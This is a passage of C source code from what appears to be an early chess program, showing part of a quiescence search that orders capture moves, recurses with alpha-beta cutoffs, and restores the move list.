			*p3++ = (((pval+6)[board[*p2>>8]]/100)<<8) |
				(-(pval+6)[board[*p2&0377]]/100);
			*p3++ = *p2;
		}
		p2++;
	}
	if(p3 == p1) {
		lmp = p1;
		return(value);
	}
	ply++;
	qsort(p1, p3);
	lmp = p3;
	p2 = p1;
	v1 = value;
	while(p2 != lmp) {
		p2++;
		wmove(*p2);
		if(battack(wkpos)) {
			v2 = bquies(v1);
		} else
			v2 = 3000;
		if(v2 < v1)
			v1 = v2;
		wremove();
		if(v1 <= ab)
			goto out;
		p2++;
	}
out:
	ply--;
	lmp = p1;
	return(v1);
}
